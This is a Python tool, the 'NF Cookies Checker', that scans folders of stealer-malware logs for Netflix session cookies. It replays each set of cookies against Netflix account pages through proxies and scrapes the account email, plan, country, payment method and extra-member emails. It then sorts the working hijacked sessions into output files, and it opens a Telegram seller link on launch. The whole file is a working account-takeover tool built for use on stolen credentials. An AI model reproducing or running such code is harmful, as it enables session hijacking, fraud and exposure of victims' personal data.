import requests
import re
from datetime import datetime
import os
import ctypes
import time
import time
import webbrowser
from concurrent.futures import ThreadPoolExecutor
import json
import threading
import pycountry
import warnings
import urllib
import shutil
from bs4 import BeautifulSoup
from latest_user_agents import get_random_user_agent
import easygui
warnings.filterwarnings("ignore", message="Failed to patch SSL settings for unverified requests")
from conn import conn
import colorama
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
colorama.init()
warnings.filterwarnings("ignore", message="Failed to patch SSL settings for unverified requests")
if os.path.exists(os.path.join(os.getcwd(),"Result")):
    pass
else:
    os.mkdir("Result")
class NETFLIXCOOKIE:
    def __init__(self) -> None:
        self.invalids = 0
        self.valids = 0
        self.Total = 0
        self.extramember=0
        self.payment=0
        self.glob_tr=True
    def chkformail(self,headers,filename):
        utr="https://www.netflix.com/account/security"
        myreq=conn((requests.get),utr,headers=headers,filesname=filename,verify=False)
        if myreq is None:
            return None
        pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'
        matches = re.findall(pattern,myreq.text)
        if matches:
            email = matches[0]
            return email
        else:
            return None
    def getcountryname(self,country):
        venure=pycountry.countries.get(alpha_2=country)
        return venure.name
    def print_stats(self, lin):
        while True:
            if self.glob_tr==False:
                break
            else:
                ctypes.windll.kernel32.SetConsoleTitleW(f"[NF Checker]--BY @BINARY_THUG|VALIDS:{self.valids}|INVALIDS:{self.invalids}|TOTAL LOGS FOLDER:{len(lin)}")
    def getpassword(self, dir):
        for root, dirs, files in os.walk(dir):
            for file in files:
                if "pass" in str(file).lower():
                    return os.path.join(root, file)
        return None
    def extract_lines(self, keyword,fi):
        with open(fi, "r",errors="ignore",encoding='utf-8') as file:
            lines = file.readlines()

        for i, line in enumerate(lines):
            if keyword in line:
                if i + 2 < len(lines):
                    captured_lines = lines[i + 1:i + 3]
                    return captured_lines
                else:
                    return None
        return None
    def checkif_accountcancel(self,text):
        if '<a data-uia="action-restart-membership" class="btn account-cancel-button btn-gray btn-small" href="/" target="_top">' in text:
            return "CUSTOM"
        else:
            return "NONPTA"
        
        


    def net_to_cookie(self, filename, service):
        cookies = {}
        NF_line = []
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                                NF_line.append(line)
                    except Exception:
                        continue
        except UnicodeDecodeError:
            with open(filename, 'r') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                                NF_line.append(line)
                    except Exception:
                        continue

        return cookies, NF_line
    def grabemail(self,filename,headers):
        make=conn((requests.get),'https://www.netflix.com/mfa',headers=headers,filesname=filename)
        if make is None:
            return None
        else:
            soupin=BeautifulSoup(make.text,"html.parser")
            try:
                email = soupin.find('span', class_='factor-button-secondary-text').text
                return email
            except:
                return None
    def ui(self):
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'NF COOKIES CHECKER  - MADE BY @BINARY_THUG') 
        text = '''    
███╗   ██╗███████╗     ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗███████╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
████╗  ██║██╔════╝    ██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║██╔════╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██╔██╗ ██║█████╗      ██║     ██║   ██║██║   ██║█████╔╝ ██║█████╗      ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║╚██╗██║██╔══╝      ██║     ██║   ██║██║   ██║██╔═██╗ ██║██╔══╝      ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║ ╚████║██║         ╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║███████╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═══╝╚═╝          ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝


*************************                                                                                                                              
WITH EXTRA INVITES SORTER
THIS TOOL IS FREE
*************************                                                                                                                                                                
'''        
        faded = ''
        red = 20
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(self.center(faded))

    def center(self, var: str, space: int = None):  # From Pycenter
        if not space:
            space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())

    def Path(self, path):
        paths = []
        for root, dirs, files in os.walk(path):
            for dir in dirs:
                if dir in {'cookies', 'COOKIES', 'Cookie', 'Cookies', 'COOKIE'}:
                    paths.append((os.path.join(root, dir),root))
        return set(paths)
    def print_horizontal_line(self,character='='):
        terminal_width = os.get_terminal_size().columns
        print(colorama.Fore.CYAN+character * terminal_width+colorama.Fore.RESET)
    def chkextrameber(self,headers):
        make=requests.get('https://www.netflix.com/accountowner/addextramember',headers=headers)
        if make.url=='https://www.netflix.com/accountowner/addextramember':
            return True
        else:
            msn=requests.get('https://www.netflix.com/account/membership/extra-members',headers=headers)
            if msn.url=='https://www.netflix.com/account/membership/extra-members':
                return True
            else:
                return False
    def chkforextramemberenaik(self,filename,heade):
        EXTRAMEM=conn((requests.get),"https://www.netflix.com/account/membership/extra-members",headers=heade,filesname=filename) 
        if EXTRAMEM is None:
            return "[]"
        else:
            pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'
            matches = re.findall(pattern,EXTRAMEM.text)
            if matches:
                return str(matches) 
            else:
                return "[]"
                 
    def chkformail(self,headers,filename):
        utr="https://www.netflix.com/account/security"
        myreq=conn((requests.get),utr,headers=headers,filesname=filename,verify=False)
        if myreq is None:
            return None
        pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'
        matches = re.findall(pattern,myreq.text)
        if matches:
            email = matches[0]
            return email
        else:
            return None
    
    def chkonhold(self,txt):
        response=txt
        soup = BeautifulSoup(response, 'html.parser')
        desired_p_tag = soup.find('p', class_='default-ltr-cache-1av505g')
        if desired_p_tag:
            desired_content = desired_p_tag.get_text()
            return "[ONHOLD]"
        else:
            return ''
    def check_json_cookies(self,file_path):
        try:
            with open(file_path, 'r') as file:
                cookies = json.load(file)
                if isinstance(cookies, list) and all('domain' in cookie for cookie in cookies):
                    return True
        except (json.JSONDecodeError, FileNotFoundError):
            pass
        return False
    def rechecker_runner(self,path,filename,direname):
        with ThreadPoolExecutor(max_workers=20) as tree:
            for root,dirs,files in os.walk(path):
                for file in files:
                    if str(file).endswith(".txt"):
                        file_path=os.path.join(root,file)
                        try:
                            tree.submit(self.rechecker,file_path,'jk',filename,False,direname)
                        except:
                            continue
            t=threading.Thread(target=self.print_stats,args=([],))
            t.daemon=True
            t.start()
            os.system("cls")
            self.ui()
            tree.shutdown(wait=True)
            self.glob_tr=False
                    
    def rechecker(self,full_path,pathpassword,filename,savelogs,dirname):
            cookie, NF_LINES = self.net_to_cookie(full_path, "netflix")
            if not cookie:
                print(colorama.Fore.RED+"[0] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {full_path} "+colorama.Fore.RESET+"|")
                self.invalids += 1
                return None
            else:
                        cookie_string = "; ".join([f"{name}={value}" for name, value in cookie.items()])
                        headers = {
                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": "en-US,en;q=0.9",
                            "cache-control": "no-cache",
                            "pragma": "no-cache",
                            "sec-ch-ua": "\"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"",
                            "sec-ch-ua-mobile": "?0",
                            "sec-fetch-dest": "document",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-site": "none",
                            "sec-fetch-user": "?1",
                            "upgrade-insecure-requests": "1",
                            "user-agent": get_random_user_agent(),
                            "Cookie": cookie_string,
                            "Connection": "close"
                        }
                        self.url = "https://www.netflix.com/YourAccount"
                        client = requests.Session()
                        try:
                            info = conn((client.get),self.url, headers=headers,verify=False,filesname=filename).text
                            client.cookies.clear()
                        except Exception as e:
                            self.invalids += 1
                            return None
                        try:
                            plan = info.split('data-uia="plan-label"><b>')[1].split('</b>')[0]
                        except IndexError:
                            soup=BeautifulSoup(info,"html.parser")
                            h3_tag = soup.find('h3', class_='default-ltr-cache-10ajupv e19xx6v32')
                            if h3_tag:
                                    extracted_text = h3_tag.text
                                    plan=extracted_text
                            else:
                                try:
                                    plan=info.split('<div class="account-section-item" data-uia="plan-label">')[1].split("</p><p>")[0].split('<p class="beneficiary-header">')[1].replace(":","")
                                except IndexError:
                                    plan="NULL"
                        try:
                            country = self.getcountryname(info.split('","currentCountry":"')[1].split('"')[0])
                        except IndexError:
                            country = "NULL"
                        try:
                            paymentmethod=info.split('<div class="wallet--mop" data-uia="wallet-mop"><')[1].split('img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/')[1].split('alt=')[0].replace('"','')
                            payvhk=f"[{paymentmethod}]"
                        except Exception as e:
                            paymentmethod=""
                            payvhk=""
                            
                        try:
                            expiry = info.split('data-uia="nextBillingDate-item">')[1].split('<')[0]
                        except IndexError:
                            expiry = "NULL"
                        pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'
                        matches = re.findall(pattern, info)
                        if matches:
                            email = matches[0]
                        else:
                            soup = BeautifulSoup(info, 'html.parser')
                            username_tag = soup.find('div', class_='profile-summary')
                            if username_tag is not None:
                                emai=username_tag.find('h3')
                                if username_tag:
                                    email = username_tag.text
                                else:
                                    email=None
                            else:
                                email=None
                        if email is  None:
                            print(colorama.Fore.RED+"[0] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {full_path} "+colorama.Fore.RESET+"|")
                            self.invalids=self.invalids+1 
                            return None
                        else:
                            try:
                                chkonhold=self.chkonhold(info)
                                ck=self.checkif_accountcancel(info)
                                emma=self.chkformail(headers,filename)
                                if ck=='CUSTOM':
                                    max="[CUSTOM]"
                                else:
                                    max=""
                                extramember=self.chkextrameber(headers)
                                if extramember != False:
                                    if '.png' in email:
                                        extrammebremail=self.chkforextramemberenaik(filename,headers)
                                        txtvar=f"{max}{payvhk}[{country}][EXTRAMEMBER][{plan}][{emma}]{chkonhold}[{email}].txt".replace("/","")
                                        hemidal=f"\nBY @BINARY_THUG\nEmail:{emma}\nCountry:{country}\nPlan:{plan}\nEXTRAMEMBERSEMAILS:{extrammebremail}\n"
                                        self.extramember=self.extramember+1
                                    else:
                                        extrammebremail=self.chkforextramemberenaik(filename,headers)
                                        txtvar=f"{max}{payvhk}[{country}][EXTRAMEMBER][{plan}][{email}]{chkonhold}.txt".replace("/","")
                                        hemidal=f"\nBY @BINARY_THUG\nEmail:{email}\nCountry:{country}\nPlan:{plan}\nEXTRAMEMBERSEMAILS:{extrammebremail}\n"
                                        self.extramember=self.extramember+1
                                else:
                                    if '.png' in email:
                                        hemidal=f"\nBY @BINARY_THUG\nEmail:{emma}\nCountry:{country}\nPlan:{plan}\n"
                                        txtvar = f"{max}{payvhk}[{emma}][{country}][{email}][{plan}]{chkonhold}.txt".replace("/","")
                                    else:
                                        hemidal=f"\nBY @BINARY_THUG\nEmail:{email}\nCountry:{country}\nPlan:{plan}\n"
                                        txtvar = f"{max}{payvhk}[{country}][{email}][{plan}]{chkonhold}.txt".replace("/","")
                                extramember_path=os.path.join(dirname,"EXTRAMEMBER")
                                if os.path.exists(extramember_path):
                                    pass
                                else:
                                    os.mkdir(extramember_path)
                                simple_path=os.path.join(dirname,"SIMPLE")
                                if os.path.exists(simple_path):
                                    pass
                                else:
                                    os.mkdir(simple_path)
                                if extramember==False:
                                    extt=os.path.join(dirname,simple_path,txtvar)
                                else:
                                    extt=os.path.join(dirname,extramember_path,txtvar)
                                self.valids=self.valids+1
                                print(colorama.Fore.GREEN+"[*] VALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {full_path} "+colorama.Fore.RESET+"|")
                                with open(extt, 'w', errors="ignore", encoding='utf-8') as ramdi:
                                    for lines in NF_LINES:
                                        ramdi.write(lines)                         
                            except Exception as e:
                                return None
        
    def checker(self, path,pathpassword,filename,savelogs,dirname):
        for root, dirs, files in os.walk(path):
            for fil in files:
                if str(fil).endswith(".txt"):
                    full_path = os.path.join(root, fil)
                    cookie, NF_LINES = self.net_to_cookie(full_path, "netflix")
                    if not cookie:
                        print(colorama.Fore.RED+"[0] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
                        self.invalids += 1
                        continue
                    else:
                        cookie_string = "; ".join([f"{name}={value}" for name, value in cookie.items()])
                        headers = {
                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": "en-US,en;q=0.9",
                            "cache-control": "no-cache",
                            "pragma": "no-cache",
                            "sec-ch-ua": "\"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"",
                            "sec-ch-ua-mobile": "?0",
                            "sec-fetch-dest": "document",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-site": "none",
                            "sec-fetch-user": "?1",
                            "upgrade-insecure-requests": "1",
                            "user-agent": get_random_user_agent(),
                            "Cookie": cookie_string,
                            "Connection": "close"
                        }
                        self.url = "https://www.netflix.com/YourAccount"
                        client = requests.Session()
                        try:
                            info = conn((client.get),self.url, headers=headers,verify=False,filesname=filename).text
                            client.cookies.clear()
                        except Exception as e:
                            self.invalids += 1
                            continue
                        try:
                            plan = info.split('data-uia="plan-label"><b>')[1].split('</b>')[0]
                        except IndexError:
                            soup=BeautifulSoup(info,"html.parser")
                            h3_tag = soup.find('h3', class_='default-ltr-cache-10ajupv e19xx6v32')
                            if h3_tag:
                                    extracted_text = h3_tag.text
                                    plan=extracted_text
                            else:
                                try:
                                    plan=info.split('<div class="account-section-item" data-uia="plan-label">')[1].split("</p><p>")[0].split('<p class="beneficiary-header">')[1].replace(":","")
                                except IndexError:
                                    plan="NULL"
                        try:
                            country = self.getcountryname(info.split('","currentCountry":"')[1].split('"')[0])
                        except IndexError:
                            country = "NULL"
                        try:
                            paymentmethod=info.split('<div class="wallet--mop" data-uia="wallet-mop"><')[1].split('img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/')[1].split('alt=')[0].replace('"','')
                            payvhk=f"[{paymentmethod}]"
                        except Exception as e:
                            paymentmethod=""
                            payvhk=""
                            
                        try:
                            expiry = info.split('data-uia="nextBillingDate-item">')[1].split('<')[0]
                        except IndexError:
                            expiry = "NULL"
                        pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'
                        matches = re.findall(pattern, info)
                        if matches:
                            email = matches[0]
                        else:
                            soup = BeautifulSoup(info, 'html.parser')
                            username_tag = soup.find('div', class_='profile-summary')
                            if username_tag is not None:
                                emai=username_tag.find('h3')
                                if username_tag:
                                    email = username_tag.text
                                else:
                                    email=None
                            else:
                                email=None
                        if email is  None:
                            print(colorama.Fore.RED+"[0] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
                            self.invalids=self.invalids+1 
                            continue
                        else:
                            try:
                                chkonhold=self.chkonhold(info)
                                ck=self.checkif_accountcancel(info)
                                emma=self.chkformail(headers,filename)
                                if ck=='CUSTOM':
                                    max="[CUSTOM]"
                                else:
                                    max=""
                                extramember=self.chkextrameber(headers)
                                if extramember != False:
                                    if '.png' in email:
                                        extrammebremail=self.chkforextramemberenaik(filename,headers)
                                        txtvar=f"{max}{payvhk}[{country}][EXTRAMEMBER][{plan}][{emma}]{chkonhold}[{email}].txt".replace("/","")
                                        hemidal=f"\nBY @BINARY_THUG\nEmail:{emma}\nCountry:{country}\nPlan:{plan}\nEXTRAMEMBERSEMAILS:{extrammebremail}\n"
                                        self.extramember=self.extramember+1
                                    else:
                                        extrammebremail=self.chkforextramemberenaik(filename,headers)
                                        txtvar=f"{max}{payvhk}[{country}][EXTRAMEMBER][{plan}][{email}]{chkonhold}.txt".replace("/","")
                                        hemidal=f"\nBY @BINARY_THUG\nEmail:{email}\nCountry:{country}\nPlan:{plan}\nEXTRAMEMBERSEMAILS:{extrammebremail}\n"
                                        self.extramember=self.extramember+1
                                else:
                                    if '.png' in email:
                                        hemidal=f"\nBY @BINARY_THUG\nEmail:{emma}\nCountry:{country}\nPlan:{plan}\n"
                                        txtvar = f"{max}{payvhk}[{emma}][{country}][{email}][{plan}]{chkonhold}.txt".replace("/","")
                                    else:
                                        hemidal=f"\nBY @BINARY_THUG\nEmail:{email}\nCountry:{country}\nPlan:{plan}\n"
                                        txtvar = f"{max}{payvhk}[{country}][{email}][{plan}]{chkonhold}.txt".replace("/","")
                                extramember_path=os.path.join(dirname,"EXTRAMEMBER")
                                if os.path.exists(extramember_path):
                                    pass
                                else:
                                    os.mkdir(extramember_path)
                                simple_path=os.path.join(dirname,"SIMPLE")
                                if os.path.exists(simple_path):
                                    pass
                                else:
                                    os.mkdir(simple_path)
                                if extramember==False:
                                    extt=os.path.join(dirname,simple_path,txtvar)
                                else:
                                    extt=os.path.join(dirname,extramember_path,txtvar)
                                self.valids=self.valids+1
                                print(colorama.Fore.GREEN+"[*] VALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
                                with open(extt, 'w', errors="ignore", encoding='utf-8') as ramdi:
                                    for lines in NF_LINES:
                                        ramdi.write(lines)                         
                            except Exception as e:
                                continue
    def runner(self,logs_path,workers,proxy,savelog,dirname):
        print(colorama.Fore.CYAN+"LOADING MODULE")
        path_list=self.Path(path=logs_path)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            for pat in path_list:
                garou,saitama=pat
                try:
                    executor.submit(self.checker,garou,saitama,proxy,savelog,dirname)
                except:
                    continue 
            t=threading.Thread(target=self.print_stats,args=(path_list,))
            t.daemon=True
            t.start()
            os.system("cls")
            self.ui()
            executor.shutdown(wait=True)
            self.glob_tr=False
        
def maximize_console_window():
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 3)                

def datetimefolder(path):
    current_datetime = datetime.now().strftime("%m-%d-%y_%H-%M-%S")
    shia = os.path.join(path, current_datetime)
    os.mkdir(shia)
    return shia
def main():
    webbrowser.open_new_tab("https://t.me/SELLERXII")
    os.system("cls")
    print(colorama.Fore.CYAN+"Wait Loading Model")
    maximize_console_window()
    os.system("cls")
    NF=NETFLIXCOOKIE()
    NF.ui()
    print(f"""
          
          [{colorama.Fore.CYAN}Main Menu{colorama.Fore.RESET}]

    [{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER
    
    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] RECHECK[NEED SOME MORE WORK]

    [{colorama.Fore.CYAN}3{colorama.Fore.RESET}] Exit
    
    """)
    type=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
    if type=="1":
        os.system("cls")
        current = os.path.join(os.getcwd(), "Result")
        logs_pathi=easygui.diropenbox(title="NFCOOKIE CHECKER- SELECT LOGS FOLDER")
        mkme=os.path.join(current,os.path.basename(logs_pathi))
        k=''
        if os.path.exists(mkme):
            with open("retry.json", 'r') as json_file:
                json_data = json_file.read()
                parsed_data = json.loads(json_data)
                retro=parsed_data["retro"]
                addone=int(retro)+1
            parsed_data["retro"]=addone
            with open("retry.json", 'w') as json_file:
                json.dump(parsed_data, json_file)
            fi=f"{mkme}{retro}"
            k=fi 
            os.mkdir(fi)
        else:
            k=mkme
            os.mkdir(mkme)
        p=easygui.fileopenbox(title="NFCOOKIE CHECKER- SELECT PROXY FILE",filetypes=["*.txt"],multiple=False)
        thread_num=input(colorama.Fore.RED+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
        while int(thread_num)>26:
            os.system("cls")
            print(colorama.Fore.GREEN+"[WARNING]"+colorama.Fore.YELLOW+"Only 25 threads are allowed"+colorama.Fore.RESET)
            thread_num=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
        os.system('cls')
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"THREADS LOADED ")
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"PATH LOADED ")
        NF.runner(logs_pathi,int(thread_num),proxy=p,savelog=False,dirname=k)
        os.system("cls")
        NF.ui()
        NF.print_horizontal_line()
        print(NF.center(colorama.Fore.CYAN+"CHECKER BY @BINARY_THUG"))
        print(NF.center(colorama.Fore.GREEN+"CHECKER ENDED............"))
        print(NF.center(colorama.Fore.CYAN+"ENJOY YOUR NETFLIX COOKIES"+colorama.Fore.RESET))
        NF.print_horizontal_line()
        ctypes.windll.kernel32.SetConsoleTitleW(f"[NF COOKIE CHECKER]--BY @BINARY_THUG|VALIDS:{NF.valids}|INVALIDS:{NF.invalids}|")
        print(f"""

    [{colorama.Fore.RESET}{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit""")
        t=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
        if t=="1":
            os.system("cls")
            main()
        elif t==2:
            os.system("cls")
            sys.exit()
        else:
            os.system("cls")
            sys.exit()
    elif type=="2":
        os.system("cls")
        logs_pathi=easygui.diropenbox(title="NFCOOKIE CHECKER- SELECT FOLDER")
        current = os.path.join(os.getcwd(), "Result")
        mkme=os.path.join(current,os.path.basename(logs_pathi))
        k=''
        if os.path.exists(mkme):
            with open("retry.json", 'r') as json_file:
                json_data = json_file.read()
                parsed_data = json.loads(json_data)
                retro=parsed_data["retro"]
                addone=int(retro)+1
            parsed_data["retro"]=addone
            with open("retry.json", 'w') as json_file:
                json.dump(parsed_data, json_file)
            fi=f"{mkme}{retro}"
            k=fi 
            os.mkdir(fi)
        else:
            k=mkme
            os.mkdir(mkme)
        p=easygui.fileopenbox(title="NFCOOKIE CHECKER- SELECT PROXY FILE",filetypes=["*.txt"],multiple=False)
        NF.rechecker_runner(logs_pathi,p,k)
        os.system("cls")
        NF.ui()
        NF.print_horizontal_line()
        print(NF.center(colorama.Fore.CYAN+"CHECKER BY @BINARY_THUG"))
        print(NF.center(colorama.Fore.GREEN+"CHECKER ENDED............"))
        print(NF.center(colorama.Fore.CYAN+"ENJOY YOUR NETFLIX COOKIES"+colorama.Fore.RESET))
        NF.print_horizontal_line()
        ctypes.windll.kernel32.SetConsoleTitleW(f"[NF COOKIE CHECKER]--BY @BINARY_THUG|VALIDS:{NF.valids}|INVALIDS:{NF.invalids}|")
        print(f"""

    [{colorama.Fore.RESET}{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit""")
        t=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
        if t=="1":
            os.system("cls")
            main()
        elif t==2:
            os.system("cls")
            sys.exit()
        else:
            os.system("cls")
            sys.exit()
    elif type=="3":
        os.system("cls")
        sys.exit()
    else:
        os.system("cls")
        sys.exit()
main()